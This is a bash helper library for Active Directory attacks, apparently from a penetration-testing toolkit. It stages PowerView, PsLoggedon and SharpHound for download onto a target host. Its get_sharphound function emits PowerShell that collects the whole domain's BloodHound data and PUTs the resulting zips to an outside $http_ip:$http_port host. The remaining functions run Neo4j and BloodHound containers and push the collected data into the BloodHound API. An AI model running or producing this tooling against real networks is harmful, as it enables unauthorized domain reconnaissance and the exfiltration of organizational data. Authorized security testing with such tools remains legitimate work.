#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
get_powerview() {
    if [[ -f "powerview.ps1" ]]; then
        echo "Powerview script already exists, skipping download."
        return 0
    fi
    cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 PowerView.ps1
    generate_iwr PowerView.ps1
    echo '. .\PowerView.ps1;'
}

get_ldap_search() {
    if [[ -f "ldap_search.ps1" ]]; then
        echo "LDAPSearch script already exists, skipping download."
        return 0
    fi
    cp $SCRIPTDIR/../ps1/ldap_search.ps1 ldap_search.ps1   
    generate_iwr ldap_search.ps1
    echo '. .\ldap_search.ps1;'
}

get_psloggedon() {

    if [[ ! -f "/tmp/PsTools.zip" ]]; then
        wget "https://download.sysinternals.com/files/PSTools.zip" -O /tmp/PSTools.zip >> $trail_log
    fi
    if [[ ! -f "/tmp/PsLoggedon.exe" ]]; then
        pushd /tmp > /dev/null
        unzip -u PSTools.zip >> $trail_log
        popd > /dev/null
    fi
    if [[ ! -f "PsLoggedon.exe" ]]; then
        cp /tmp/PsLoggedon.exe .        
    fi
    generate_iwr PsLoggedon.exe
    echo '.\PsLoggedon.exe;'
}

get_sharphound() {
    sharphound_version=v2.6.7
    sharphound_url="https://github.com/SpecterOps/SharpHound/releases/expanded_assets/$sharphound_version"
    sharphound_download_url=$(curl -s $sharphound_url | grep -oP 'href="\K[^"]+' | grep "zip$" | grep "${sharphound_version}_windows")
    echo "Downloading SharpHound from: $sharphound_download_url" >> $trail_log
    if [[ ! -f "/tmp/sharphound_$sharphound_version.zip" ]]; then    
        wget "https://github.com$sharphound_download_url" -O /tmp/sharphound_$sharphound_version.zip >> $trail_log
    fi
    pushd /tmp > /dev/null
    unzip -u sharphound_$sharphound_version.zip >> $trail_log
    popd > /dev/null
    if [[ ! -f "SharpHound.ps1" ]]; then
        cp /tmp/SharpHound.ps1 .
    else
        echo "SharpHound executable not found after extraction." >> $trail_log
    fi
    generate_iwr SharpHound.ps1
    echo '. .\SharpHound.ps1;'
    echo 'Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "audit";'
    echo 'Get-ChildItem -Filter "audit*.zip" | ForEach-Object { Invoke-WebRequest -Uri "http://'$http_ip':'$http_port'/$_" -InFile $_.FullName -Method Put };'
}

start_neo4j() {
    if pgrep -f "neo4j" > /dev/null; then
        echo "Neo4j is already running."
        return 0
    fi
    sudo neo4j start & >> $trail_log
}

stop_neo4j() {
    if ! pgrep -f "neo4j" > /dev/null; then
        echo "Neo4j is not running."
        return 0
    fi
    neo4j_pid=$(pgrep -f "neo4j")
    sudo kill $neo4j_pid >> $trail_log
}

start_bloodhound() { 
    pushd "$SCRIPTDIR/../docker/bloodhound"
    if [[ ! -f "docker-compose.yml" ]]; then
        echo "docker-compose.yml not found in the current directory."
        return 1
    fi
    docker compose up -d >> $trail_log
    popd
}

stop_bloodhound() {
    pushd "$SCRIPTDIR/../docker/bloodhound"
    if ! docker compose ps | grep -q "Up"; then
        echo "BloodHound is not running."
        return 0
    fi
    docker compose down >> $trail_log
    popd
}   

bloodhound_error() {
    local return_data=$1
    if [[ -z "$return_data" ]]; then
        echo "No data returned from BloodHound API." | tee -a $trail_log
        return 1
    fi
    if [[ $(echo "$return_data" | jq -r '.errors[0].message') != "null" ]]; then
        echo "BloodHound API error: $(echo "$return_data" | jq -r '.errors[0].message')" | tee -a $trail_log
        return 1
    fi
}

bloodhound_login() {
    if [[ -z "$bloodhound_password" ]]; then
        bloodhound_password=$(cat $SCRIPTDIR/../docker/bloodhound/bloodhound.config.json | jq -r '.default_password')
        bloodhound_password+='!'
    fi
    if [[ -z "$bloodhound_ip" ]]; then
        bloodhound_ip=$(docker ps --filter ancestor=specterops/bloodhound --format json | jq -r ".Ports" | grep -oP '^\K[^:]+')
    fi
    if [[ -z "$bloodhound_port" ]]; then
        bloodhound_port=$(docker ps --filter ancestor=specterops/bloodhound --format json | jq -r ".Ports" | grep -oP ':\K[^-]+')
    fi
    local login_return=$(curl -s -d '{"login_method": "secret", "username":"admin", "secret":"'$bloodhound_password'"}' \
        -H "Content-Type: application/json" \
        http://$bloodhound_ip:$bloodhound_port/api/v2/login)
    if [[ ! -z "$login_return" ]]; then
        bloodhound_error "$login_return"
        if [[ $? -ne 0 ]]; then
            return 1
        fi
        bloodhound_authorization="Authorization: Bearer "$(echo "$login_return" | jq -r '.data.session_token')
    else
        echo "BloodHound login failed." >> $trail_log
        return 1
    fi

}


bloodhound_start_upload() {
    if [[ -z "$bloodhound_authorization" ]]; then
        echo "BloodHound authorization token is not set. Please login first." | tee -a $trail_log
        return 1
    fi
    local start_upload_return=$(curl -s -X POST http://$bloodhound_ip:$bloodhound_port/api/v2/file-upload/start \
        -H "Content-Type: application/json" \
        -H "$bloodhound_authorization" \
        -d '')
    if [[ ! -z "$start_upload_return" ]]; then
        bloodhound_error "$start_upload_return"
        if [[ $? -ne 0 ]]; then
            echo "Failed to start BloodHound upload." | tee -a $trail_log
            return 1
        fi
        bloodhound_upload_job_id=$(echo "$start_upload_return" | jq -r '.data.id')
    fi
}

bloodhound_upload_file () {
    if [[ -z "$bloodhound_upload_job_id" ]]; then
        echo "BloodHound upload job ID is not set. Please start upload first." | tee -a $trail_log
        return 1
    fi
    if [[ -z "$1" ]]; then
        echo "File path is required for upload." | tee -a $trail_log
        return 1
    fi
    local file_path="$1"
    if [[ ! -f "$file_path" ]]; then
        echo "File $file_path does not exist."
        return 1
    fi
    local upload_return=$(curl -s -X POST http://$bloodhound_ip:$bloodhound_port/api/v2/file-upload/$bloodhound_upload_job_id \
        -H "$bloodhound_authorization" \
        -H "Content-Type: application/zip" \
        --data-binary @"$file_path")
    if [[ ! -z "$upload_return" ]]; then
        bloodhound_error "$upload_return"
        if [[ $? -ne 0 ]]; then
            echo "Failed to upload files" | tee -a $trail_log
            return 1
        fi
        echo "File uploaded successfully: $upload_return"
    else
        echo "File upload failed." >> $trail_log
        return 1
    fi

}

bloodhound_end_upload() {
    if [[ -z "$bloodhound_upload_job_id" ]]; then
        echo "BloodHound upload job ID is not set. Please start upload first." | tee -a $trail_log
        return 1
    fi
    local end_upload_return=$(curl -s -X POST http://$bloodhound_ip:$bloodhound_port/api/v2/file-upload/$bloodhound_upload_job_id/end \
        -H "Content-Type: application/json" \
        -H "$bloodhound_authorization" \
        -d '')
    if [[ ! -z "$end_upload_return" ]]; then
        bloodhound_error "$end_upload_return"
        if [[ $? -ne 0 ]]; then
            echo "Failed to end BloodHound upload." | tee -a $trail_log
            return 1
        fi
        echo "BloodHound upload ended successfully."
    else
        echo "Failed to end BloodHound upload." >> $trail_log
        return 1
    fi
}

upload_bloodhound_data() {
    bloodhound_login
    bloodhound_start_upload
    bloodhound_upload_file "$1"
    bloodhound_end_upload
}